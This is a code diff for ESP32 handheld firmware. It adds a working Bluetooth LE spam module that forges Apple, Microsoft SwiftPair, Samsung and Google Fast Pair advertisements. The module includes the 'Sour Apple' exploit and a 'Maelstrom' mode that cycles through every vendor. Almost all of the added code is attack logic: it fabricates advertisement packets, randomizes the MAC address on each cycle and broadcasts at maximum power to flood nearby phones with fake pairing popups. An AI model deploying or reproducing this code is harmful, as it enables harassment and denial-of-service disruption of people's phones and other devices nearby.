@@ -1,7 +1,43 @@
-#include <BLEDevice.h>
+
+#include "ble_spam.h"
 #include "display.h"
 #include "mykeyboard.h"
 #include "globals.h"
+
+extern "C" {
+  uint8_t esp_base_mac_addr[6];
+  esp_err_t esp_ble_gap_set_rand_addr(const uint8_t *rand_addr);
+}
+
+struct BLEData
+{
+  NimBLEAdvertisementData AdvData;
+  NimBLEAdvertisementData ScanData;
+};
+
+struct WatchModel
+{
+    uint8_t value;
+    const char *name;
+};
+
+//WatchModel* watch_models = nullptr;
+
+struct mac_addr {
+   unsigned char bytes[6];
+};
+
+struct Station {
+  uint8_t mac[6];
+  bool selected;
+};
+enum EBLEPayloadType
+{
+  Microsoft,
+  Apple,
+  Samsung,
+  Google
+};
 
 // globals for passing bluetooth info between routines
 // AppleJuice Payload Data 
@@ -35,6 +71,9 @@ uint8_t SetupNewPhone[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x0
 uint8_t TransferNumber[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
 uint8_t TVColorBalance[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
 uint8_t AppleVisionPro[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
+
+uint8_t Airpods_AppleTV[54] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
+
 uint8_t* data;
 int deviceType = 0; 
 
@@ -245,6 +284,34 @@ DeviceType android_models[] = {
     {0x92ADC9, "Ton Upgrade Netflix"},
 };
 
+WatchModel watch_models[26] = {
+  {0x1A, "Fallback Watch"},
+  {0x01, "White Watch4 Classic 44m"},
+  {0x02, "Black Watch4 Classic 40m"},
+  {0x03, "White Watch4 Classic 40m"},
+  {0x04, "Black Watch4 44mm"},
+  {0x05, "Silver Watch4 44mm"},
+  {0x06, "Green Watch4 44mm"},
+  {0x07, "Black Watch4 40mm"},
+  {0x08, "White Watch4 40mm"},
+  {0x09, "Gold Watch4 40mm"},
+  {0x0A, "French Watch4"},
+  {0x0B, "French Watch4 Classic"},
+  {0x0C, "Fox Watch5 44mm"},
+  {0x11, "Black Watch5 44mm"},
+  {0x12, "Sapphire Watch5 44mm"},
+  {0x13, "Purpleish Watch5 40mm"},
+  {0x14, "Gold Watch5 40mm"},
+  {0x15, "Black Watch5 Pro 45mm"},
+  {0x16, "Gray Watch5 Pro 45mm"},
+  {0x17, "White Watch5 44mm"},
+  {0x18, "White & Black Watch5"},
+  {0x1B, "Black Watch6 Pink 40mm"},
+  {0x1C, "Gold Watch6 Gold 40mm"},
+  {0x1D, "Silver Watch6 Cyan 44mm"},
+  {0x1E, "Black Watch6 Classic 43m"},
+  {0x20, "Green Watch6 Classic 43m"},
+};
 
 const char* generateRandomName() {
   const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
@@ -257,22 +324,256 @@ const char* generateRandomName() {
   return randomName;
 }
 
+void generateRandomMac(uint8_t* mac) {
+  // Set the locally administered bit and unicast bit for the first byte
+  mac[0] = 0x02; // The locally administered bit is the second least significant bit
+
+  // Generate the rest of the MAC address
+  for (int i = 1; i < 6; i++) {
+    mac[i] = random(0, 255);
+  }
+}
+
 int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
+
+//ESP32 Sour Apple by RapierXbox
+//Exploit by ECTO-1A
+NimBLEAdvertising *pAdvertising;
+
+//// https://github.com/Spooks4576
+NimBLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
+  NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
+
+  uint8_t* AdvData_Raw = nullptr;
+  uint8_t i = 0;
+
+  switch (Type) {
+    case Microsoft: {
+      
+      const char* Name = generateRandomName();
+
+      uint8_t name_len = strlen(Name);
+
+      AdvData_Raw = new uint8_t[7 + name_len];
+
+      AdvData_Raw[i++] = 7 + name_len - 1;
+      AdvData_Raw[i++] = 0xFF;
+      AdvData_Raw[i++] = 0x06;
+      AdvData_Raw[i++] = 0x00;
+      AdvData_Raw[i++] = 0x03;
+      AdvData_Raw[i++] = 0x00;
+      AdvData_Raw[i++] = 0x80;
+      memcpy(&AdvData_Raw[i], Name, name_len);
+      i += name_len;
+
+      AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
+      break;
+    }
+    case Apple: {
+      AdvData_Raw = new uint8_t[17];
+
+      AdvData_Raw[i++] = 17 - 1;    // Packet Length
+      AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
+      AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
+      AdvData_Raw[i++] = 0x00;        // ...
+      AdvData_Raw[i++] = 0x0F;  // Type
+      AdvData_Raw[i++] = 0x05;                        // Length
+      AdvData_Raw[i++] = 0xC1;                        // Action Flags
+      //const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
+      //AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
+      AdvData_Raw[i++] = data[rand() % sizeof(data)];  // Action Type
+      esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
+      i += 3;   
+      AdvData_Raw[i++] = 0x00;  // ???
+      AdvData_Raw[i++] = 0x00;  // ???
+      AdvData_Raw[i++] =  0x10;  // Type ???
+      esp_fill_random(&AdvData_Raw[i], 3);
+
+      AdvData.addData(std::string((char *)AdvData_Raw, 17));
+      break;
+    }
+    case Samsung: {
+
+      AdvData_Raw = new uint8_t[15];
+
+      uint8_t model = watch_models[rand() % 25].value;
+      
+      AdvData_Raw[i++] = 14; // Size
+      AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+      AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+      AdvData_Raw[i++] = 0x00; // ...
+      AdvData_Raw[i++] = 0x01;
+      AdvData_Raw[i++] = 0x00;
+      AdvData_Raw[i++] = 0x02;
+      AdvData_Raw[i++] = 0x00;
+      AdvData_Raw[i++] = 0x01;
+      AdvData_Raw[i++] = 0x01;
+      AdvData_Raw[i++] = 0xFF;
+      AdvData_Raw[i++] = 0x00;
+      AdvData_Raw[i++] = 0x00;
+      AdvData_Raw[i++] = 0x43;
+      AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
+
+      AdvData.addData(std::string((char *)AdvData_Raw, 15));
+
+      break;
+    }
+    case Google: {
+      AdvData_Raw = new uint8_t[14];
+      AdvData_Raw[i++] = 3;
+      AdvData_Raw[i++] = 0x03;
+      AdvData_Raw[i++] = 0x2C; // Fast Pair ID
+      AdvData_Raw[i++] = 0xFE;
+
+      AdvData_Raw[i++] = 6;
+      AdvData_Raw[i++] = 0x16;
+      AdvData_Raw[i++] = 0x2C; // Fast Pair ID
+      AdvData_Raw[i++] = 0xFE;
+
+      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
+      AdvData_Raw[i++] = (model >> 0x10) & 0xFF;
+      AdvData_Raw[i++] = (model >> 0x08) & 0xFF;
+      AdvData_Raw[i++] = (model >> 0x00) & 0xFF;
+
+      //AdvData_Raw[i++] = 0x00; // Smart Controller Model ID
+      //AdvData_Raw[i++] = 0xB7;
+      //AdvData_Raw[i++] = 0x27;
+
+      AdvData_Raw[i++] = 2;
+      AdvData_Raw[i++] = 0x0A;
+      AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+
+      AdvData.addData(std::string((char *)AdvData_Raw, 14));
+      break;
+    }
+    default: {
+      Serial.println("Please Provide a Company Type");
+      break;
+    }
+  }
+
+  delete[] AdvData_Raw;
+
+  return AdvData;
+}
+  //// https://github.com/Spooks4576
+
+
+void executeSourApple() {
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
+    NimBLEDevice::init("");
+    NimBLEServer *pServer = NimBLEDevice::createServer();
+
+    pAdvertising = pServer->getAdvertising();
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+    delay(40);
+    //NimBLEAdvertisementData advertisementData = getOAdvertisementData();
+    NimBLEAdvertisementData advertisementData = GetUniversalAdvertisementData(Apple);
+    pAdvertising->setAdvertisementData(advertisementData);
+    pAdvertising->start();
+    delay(20);
+    pAdvertising->stop();
+}
+
+void executeSwiftpairSpam(EBLEPayloadType type) {
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
+
+    NimBLEDevice::init("");
+
+    NimBLEServer *pServer = NimBLEDevice::createServer();
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+    pAdvertising = pServer->getAdvertising();
+
+    //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
+    NimBLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
+    pAdvertising->setAdvertisementData(advertisementData);
+    pAdvertising->start();
+    delay(10);
+    pAdvertising->stop();
+
+    NimBLEDevice::deinit();
+}
+
+void aj_adv(int ble_choice){
+
+  if (ble_choice==5) data = Airpods_AppleTV;
+  int mael = 0;
+  int timer = 0;
+  int count = 0;
+  timer = millis();
+  while(1) {
+    if(millis()-timer >1000) {
+
+      switch(ble_choice){
+        case 0: // Applejuice
+          data = Airpods;
+          displayRedStripe("Applejuice (" + String(count) + ")",TFT_WHITE,FGCOLOR);
+          executeSourApple();
+          break;
+        case 1: // SwiftPair
+          displayRedStripe("SwiftPair  (" + String(count) + ")",TFT_WHITE,FGCOLOR);
+          executeSwiftpairSpam(Microsoft);
+          break;
+        case 2: // Samsung
+          displayRedStripe("Samsung  (" + String(count) + ")",TFT_WHITE,FGCOLOR);
+          executeSwiftpairSpam(Samsung);
+          break;
+        case 3: // Sour Apple
+          data = AppleTVPair;
+          displayRedStripe("SourApple  (" + String(count) + ")",TFT_WHITE,FGCOLOR);
+          executeSourApple();
+          break;
+        case 4: // Android
+          displayRedStripe("Android  (" + String(count) + ")",TFT_WHITE,FGCOLOR);
+          executeSwiftpairSpam(Google);
+          break;
+        case 5: // Tutti-frutti
+          displayRedStripe("Maelstrom  (" + String(count) + ")",TFT_WHITE,FGCOLOR);
+          if(mael == 0) executeSwiftpairSpam(Google);
+          if(mael == 1) executeSwiftpairSpam(Samsung);
+          if(mael == 2) executeSwiftpairSpam(Microsoft);
+          if(mael == 3) {
+            executeSourApple();
+            mael = 0;
+          } 
+          break;
+      }
+      count++;
+      timer = millis();
+    }
+
+    if(checkEscPress()) { 
+      returnToMenu=true;
+      break;
+    }
+  }
+}
+
+
+
+
+
+
+
+
+
+
+
+/*
 
 BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 BLEAdvertising *pAdvertising;
 
 
-/**********************************************************************
-**  Function: aj_adv                                     
-**  spams BLE from choice                                
-**********************************************************************/
+//*********************************************************************
+//  Function: aj_adv                                     
+//  spams BLE from choice                                
+//********************************************************************
 void aj_adv(int ble_choice){
-
-  BLEDevice::init("");
-  BLEServer *pServer = BLEDevice::createServer();
-  pAdvertising = pServer->getAdvertising();
-  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
   tft.fillScreen(TFT_BLACK);
   bool rstOverride = true;
@@ -314,9 +615,16 @@ void aj_adv(int ble_choice){
   int tmp = 0;
   tmp=millis();
   for(;;){
-      pAdvertising->stop(); // This is placed here mostly for timing.
-                            // It allows the BLE beacon to run through the loop.
+    if(millis()-tmp>1000) {
+      uint8_t macAddr[6];
+      generateRandomMac(macAddr);
+      esp_base_mac_addr_set(macAddr);
+
+      BLEDevice::init("");
+      BLEServer *pServer = BLEDevice::createServer();
+      pAdvertising = pServer->getAdvertising();
       BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+
       if (sourApple){
         Serial.print("advertising");
         // Some code borrowed from RapierXbox/ESP32-Sour-Apple
@@ -414,38 +722,27 @@ void aj_adv(int ble_choice){
       
       pAdvertising->setAdvertisementData(oAdvertisementData);
       pAdvertising->start();
-  #if defined(M5LED)
-      digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
+      delay(100);
+  #if defined(LED)
+      digitalWrite(LED, LED_ON); //LED ON on Stick C Plus
       delay(10);
-      digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
+      digitalWrite(LED, LED_OFF); //LED OFF on Stick C Plus
   #endif
 
-      if(millis()-tmp>1000) {
-        tft.setCursor(0,0);
-        tft.setTextColor(TFT_WHITE, BGCOLOR);
-        tft.setTextSize(2);
-        tft.print("Packets: " + String(count) + "/s");
-        count=0;
-        tmp=millis();
-      }
+      
+      tft.setCursor(0,0);
+      tft.setTextColor(TFT_WHITE, BGCOLOR);
+      tft.setTextSize(2);
+      tft.print("Packets: " + String(count) + "/s");
+      count=0;
+      tmp=millis();
 
-    if (checkSelPress()) {
-
-      sourApple = false;
-      swiftPair = false;
-      maelstrom = false;
       pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
       BLEDevice::deinit();
-      delay(250);
-    }
-      // Checks para sair do while
-      #ifndef CARDPUTER
-        if(checkPrevPress()) break; // Apertar o botão power dos sticks
-      #else
-        Keyboard.update();
-        if(Keyboard.isKeyPressed('`')) break; // Apertar o ESC do cardputer
-      #endif
 
+    }
+    // Checks para sair do while
+    if(checkEscPress()) break;
   }
   pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
   BLEDevice::deinit();
@@ -453,3 +750,5 @@ void aj_adv(int ble_choice){
   tft.fillScreen(TFT_BLACK);
   returnToMenu=true;
 }
+
+*/
